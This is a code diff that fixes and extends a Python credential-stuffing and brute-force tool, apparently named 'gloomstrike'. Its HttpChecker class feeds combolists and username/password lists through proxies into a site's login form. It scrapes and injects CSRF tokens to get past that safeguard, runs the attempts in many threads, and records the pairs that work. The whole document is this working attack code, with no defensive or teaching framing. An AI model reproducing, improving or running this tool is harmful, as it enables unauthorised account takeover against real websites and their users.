@@ -1,4 +1,4 @@
-import requests, threading, time, random
+import requests, threading, time, bs4
 from gloomstrike import logger, helpers
 
 class Proxy:
@@ -17,10 +17,9 @@ class HttpChecker:
         self._url = url
         self._params = params
         self._csrf = csrf
-        self._csrf_url = csrf
+        self._csrf_url = csrf_url
         self._logger = logger
         
-        self._session = requests.Session()
         self._credentials = helpers.QueueHandler()
         self._event = threading.Event()
 
@@ -31,7 +30,7 @@ class HttpChecker:
         self._usernames = None
         self._passwords = None
 
-    def load(self, combolist_path: str, usernames_path: str, passwords_path: str, proxies_path: str):
+    def load(self, combolist_path: str, usernames_path: str, passwords_path: str, proxies_path: str) -> bool:
 
         combolist = []
         usernames = []
@@ -91,7 +90,7 @@ class HttpChecker:
 
         return False
 
-    def _background(self):
+    def _background(self) -> list:
 
         while not self._event.is_set():
 
@@ -104,7 +103,9 @@ class HttpChecker:
                 self._event.set()
 
         for thread in self._threads:
+            
             thread.join()
+            self._threads.remove(thread)
 
         return self._results
 
@@ -121,31 +122,43 @@ class HttpChecker:
                 
         return data
 
-    def _get_csrf(self):
+    def _get_csrf(self) -> tuple:
     
-        resp = self._session.get(self._csrf_url)
+        resp = requests.get(self._csrf_url)
 
-        print(resp.text)
+        if not resp.ok:
+            return None
+        
+        soup = bs4.BeautifulSoup(resp.text, 'html.parser')
+        
+        if csrf := soup.find('input', {'name': self._csrf}):
+            
+            return csrf.attrs.get('value'), resp.cookies
 
-        return resp
+        return None
 
     def _check(self, url: str, username: str, password: str) -> bool:
 
         params = self._params.replace('$USERNAME', username)
         params = params.replace('$PASSWORD', password)
-        
+
+        cookiejar = {}
+
         if self._csrf:
 
-            csrf = self._get_csrf(url)
+            if (csrf := self._get_csrf()) == None:
+                return False
+            
+            csrf_token, cookies = csrf
+            cookiejar = cookies
 
-            params = params.replace('')
+            params = params.replace('$CSRF', csrf_token)
 
         data = self._parse_params(params)
 
-        resp = requests.post(url,  data=data)
+        resp = requests.post(url,  data=data, cookies=cookiejar)
 
-        if resp.status_code == 200:
-            return True
+        return resp.ok
 
     def _checker(self):
             
@@ -156,12 +169,14 @@ class HttpChecker:
 
             self._logger.info(f'{username}:{password}', end='\r', flush=True)
 
-            if result := self._check(self._url, username, password):
+            if self._check(self._url, username, password):
 
                 self._results.append([username, password])
                 self._logger.info(f'Found valid credentials "{username}:{password}"')
 
-    def start(self, threads: int, background: bool=False):
+        self._event.set()
+
+    def start(self, threads: int, background: bool=False) -> bool:
 
         self._logger.info('Starting threads...')
 
@@ -178,6 +193,8 @@ class HttpChecker:
             self._background_thread = threading.Thread(target=self._background)
             self._background_thread.daemon = True
             self._background_thread.start()
+
+            return True
         
         else:
             return self._background()
